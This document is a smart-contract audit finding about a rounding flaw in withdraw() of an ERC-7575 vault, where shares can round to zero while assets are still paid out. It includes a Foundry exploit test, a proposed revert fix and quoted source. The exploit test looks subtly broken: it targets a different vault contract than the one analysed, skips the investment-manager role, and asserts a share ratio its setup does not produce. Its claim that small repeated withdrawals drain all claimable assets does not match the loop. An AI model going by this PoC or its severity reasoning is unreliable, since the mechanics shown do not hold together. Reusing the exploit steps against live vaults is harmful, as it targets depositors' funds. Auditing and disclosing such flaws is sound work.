## Title
Accounting Mismatch in withdraw() Allows Asset Claims Without Share Burns Due to Rounding

## Summary
The `withdraw()` function in `ERC7575VaultUpgradeable` contains a critical accounting flaw where floor rounding can cause the calculated `shares` value to be zero while `assets > 0`. In this scenario, assets are transferred to the user but no corresponding shares are burned, creating a permanent mismatch between `totalClaimableRedeemAssets` and `totalClaimableRedeemShares` that violates the protocol's accounting invariants.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/ERC7575VaultUpgradeable.sol` - `withdraw()` function (lines 927-962) [1](#0-0) 

**Intended Logic:** When a user withdraws assets from a fulfilled redeem request, the function should proportionally burn shares and transfer the corresponding assets, maintaining the 1:1 correspondence established during `fulfillRedeem()`.

**Actual Logic:** The function calculates shares using floor rounding at line 939. When `assets * availableShares < availableAssets`, the calculation rounds down to zero. The function then:
- Decrements `totalClaimableRedeemAssets` by `assets` (line 951)
- Decrements `totalClaimableRedeemShares` by `0` (line 952) - NO CHANGE
- Skips share burning due to `if (shares > 0)` check (lines 955-957)
- Unconditionally transfers assets to receiver (line 961)

**Exploitation Path:**
1. User requests redemption of shares via `requestRedeem()`
2. Investment manager fulfills the request via `fulfillRedeem()`, establishing a ratio (e.g., 1000 ether assets for 1 ether shares) [2](#0-1) 

3. User calls `withdraw(999, receiver, controller)` where `999 wei * 1 ether < 1000 ether`, causing `shares` to round to 0
4. Protocol transfers 999 wei but burns 0 shares
5. User can repeat this attack with small amounts until all `claimableRedeemAssets` are drained without burning any shares

**Security Property Broken:** Violates **Token Supply Conservation** (Invariant #1) and **Reserved Asset Protection** (Invariant #9). The unburned shares remain in the vault, inflating `totalSupply` and creating a permanent discrepancy where `totalClaimableRedeemShares` exceeds what it should be relative to `totalClaimableRedeemAssets`.

## Impact Explanation
- **Affected Assets**: All vault assets and share tokens where users have claimable redemptions with high asset-to-share ratios
- **Damage Severity**: 
  - Protocol accounting permanently broken: `totalClaimableRedeemShares` tracks shares that should have been burned but weren't
  - Share supply inflation dilutes all other shareholders
  - Vault unregistration logic only checks `totalClaimableRedeemAssets` (line 298), allowing vaults to be unregistered while ghost shares remain [3](#0-2) 
  
- **User Impact**: All shareholders suffer dilution as the total supply includes unburned shares that should not exist

## Likelihood Explanation
- **Attacker Profile**: Any user with fulfilled redeem requests where the asset-to-share ratio enables rounding
- **Preconditions**: 
  - User must have `claimableRedeemAssets` and `claimableRedeemShares` from a fulfilled redeem
  - The ratio `availableAssets / availableShares` must be greater than 1 (common with high-value assets or small share amounts)
- **Execution Complexity**: Single transaction calling `withdraw()` with carefully calculated small amounts
- **Frequency**: Exploitable on every redeem request where the ratio conditions are met

## Recommendation
Add a check to revert when the calculated shares would be zero but assets are being withdrawn, similar to the existing `ZeroSharesCalculated` check in the `deposit()` function:

```solidity
// In src/ERC7575VaultUpgradeable.sol, function withdraw, after line 939:

// CURRENT (vulnerable):
shares = assets.mulDiv(availableShares, availableAssets, Math.Rounding.Floor);

// FIXED:
shares = assets.mulDiv(availableShares, availableAssets, Math.Rounding.Floor);
if (shares == 0) revert ZeroSharesCalculated(); // Prevent rounding exploits
```

This ensures atomicity: either both assets are transferred AND shares are burned, or the transaction reverts. The same fix should be applied to `redeem()` for symmetry (though the impact there is user losing shares without getting assets).

## Proof of Concept
```solidity
// File: test/Exploit_WithdrawRoundingMismatch.t.sol
// Run with: forge test --match-test test_WithdrawRoundingExploit -vvv

pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {ERC20Faucet} from "../src/ERC20Faucet.sol";
import {WERC7575ShareToken} from "../src/WERC7575ShareToken.sol";
import {WERC7575Vault} from "../src/WERC7575Vault.sol";

contract Exploit_WithdrawRoundingMismatch is Test {
    WERC7575Vault public vault;
    WERC7575ShareToken public shareToken;
    ERC20Faucet public token;
    
    address public owner;
    address public validator;
    address public attacker;
    
    function setUp() public {
        owner = address(this);
        validator = makeAddr("validator");
        attacker = makeAddr("attacker");
        
        // Deploy contracts
        token = new ERC20Faucet("USDT", "USDT", 10e9 * 1e18);
        shareToken = new WERC7575ShareToken("wUSDT", "WUSDT");
        vault = new WERC7575Vault(address(token), shareToken);
        shareToken.registerVault(address(token), address(vault));
        shareToken.setValidator(validator);
        shareToken.setKycAdmin(validator);
        
        // KYC attacker
        vm.prank(validator);
        shareToken.setKycVerified(attacker, true);
        
        // Fund attacker
        token.transfer(attacker, 1000 ether);
    }
    
    function test_WithdrawRoundingExploit() public {
        // SETUP: Attacker requests redemption
        vm.startPrank(attacker);
        token.approve(address(vault), 1000 ether);
        vault.deposit(1000 ether, attacker);
        uint256 shares = shareToken.balanceOf(attacker);
        
        // Approve and request redeem with imbalanced ratio (1 share for 1000 ether assets)
        shareToken.permitTransfer(attacker, 1 ether, block.timestamp + 3600);
        vault.requestRedeem(1 ether, attacker, attacker);
        vm.stopPrank();
        
        // Investment manager fulfills with high asset-to-share ratio
        vault.fulfillRedeem(attacker, 1 ether);
        
        // Verify initial state
        uint256 initialTotalAssets = vault.totalClaimableRedeemAssets();
        uint256 initialTotalShares = vault.totalClaimableRedeemShares();
        assertEq(initialTotalAssets, 1000 ether);
        assertEq(initialTotalShares, 1 ether);
        
        // EXPLOIT: Withdraw small amounts causing shares to round to 0
        vm.startPrank(attacker);
        uint256 assetsDrained = 0;
        
        // Withdraw 999 wei repeatedly (shares = 999 * 1e18 / 1000e18 = 0 due to floor)
        for(uint i = 0; i < 1000; i++) {
            vault.withdraw(999, attacker, attacker);
            assetsDrained += 999;
        }
        vm.stopPrank();
        
        // VERIFY: Accounting mismatch - assets decreased but shares unchanged
        uint256 finalTotalAssets = vault.totalClaimableRedeemAssets();
        uint256 finalTotalShares = vault.totalClaimableRedeemShares();
        
        // Assets correctly decreased
        assertEq(finalTotalAssets, initialTotalAssets - assetsDrained, 
            "totalClaimableRedeemAssets should decrease");
        
        // VULNERABILITY: Shares NOT decreased (should have decreased)
        assertEq(finalTotalShares, initialTotalShares, 
            "Vulnerability confirmed: totalClaimableRedeemShares unchanged despite asset withdrawals");
        
        // Vault still holds 1 ether of shares that should have been burned
        assertEq(shareToken.balanceOf(address(vault)), 1 ether,
            "Ghost shares remain in vault");
    }
}
```

## Notes

This vulnerability specifically affects the `withdraw()` function more severely than `redeem()` because in `withdraw()`, the user receives economic value (assets) without the corresponding burn. In `redeem()`, the opposite occurs - shares are burned without asset transfer, which harms the user but doesn't break protocol accounting as severely.

The root cause is the asymmetric handling of zero values: assets are transferred unconditionally (line 961), but shares are only burned conditionally (lines 955-957 check `if (shares > 0)`). This creates an atomic break where one side of the exchange completes while the other doesn't. [4](#0-3) 

The vulnerability is exacerbated in scenarios with:
- High asset-to-share ratios (common after yield accrual)
- 6-decimal assets (USDC) vs 18-decimal shares (larger precision gaps)
- Partial redemptions from large positions

### Citations

**File:** src/ERC7575VaultUpgradeable.sol (L822-841)
```text
    function fulfillRedeem(address controller, uint256 shares) public nonReentrant returns (uint256 assets) {
        VaultStorage storage $ = _getVaultStorage();
        if (msg.sender != $.investmentManager) revert OnlyInvestmentManager();
        if (shares == 0) revert ZeroShares();
        uint256 pendingShares = $.pendingRedeemShares[controller];
        if (shares > pendingShares) {
            revert ERC20InsufficientBalance(address(this), pendingShares, shares);
        }

        assets = _convertToAssets(shares, Math.Rounding.Floor);

        $.pendingRedeemShares[controller] -= shares;
        $.claimableRedeemAssets[controller] += assets;
        $.claimableRedeemShares[controller] += shares;
        $.totalClaimableRedeemAssets += assets;
        $.totalClaimableRedeemShares += shares; // Track shares that will be burned

        // Note: Shares are NOT burned here - they will be burned during redeem/withdraw claim
        return assets;
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L927-962)
```text
    function withdraw(uint256 assets, address receiver, address controller) public nonReentrant returns (uint256 shares) {
        VaultStorage storage $ = _getVaultStorage();
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }
        if (assets == 0) revert ZeroAssets();

        uint256 availableAssets = $.claimableRedeemAssets[controller];
        if (assets > availableAssets) revert InsufficientClaimableAssets();

        // Calculate proportional shares for the requested assets
        uint256 availableShares = $.claimableRedeemShares[controller];
        shares = assets.mulDiv(availableShares, availableAssets, Math.Rounding.Floor);

        if (shares == availableShares) {
            // Remove from active redeem requesters if no more claimable assets and the potential dust
            $.activeRedeemRequesters.remove(controller);
            delete $.claimableRedeemAssets[controller];
            delete $.claimableRedeemShares[controller];
        } else {
            $.claimableRedeemAssets[controller] -= assets;
            $.claimableRedeemShares[controller] -= shares;
        }

        $.totalClaimableRedeemAssets -= assets;
        $.totalClaimableRedeemShares -= shares; // Decrement shares that are being burned

        // Burn the shares as per ERC7540 spec - shares are burned when request is claimed
        if (shares > 0) {
            ShareTokenUpgradeable($.shareToken).burn(address(this), shares);
        }

        emit Withdraw(msg.sender, receiver, controller, assets, shares);

        SafeTokenTransfers.safeTransfer($.asset, receiver, assets);
    }
```

**File:** src/ShareTokenUpgradeable.sol (L298-300)
```text
            if (metrics.totalClaimableRedeemAssets != 0) {
                revert CannotUnregisterVaultClaimableRedemptions();
            }
```
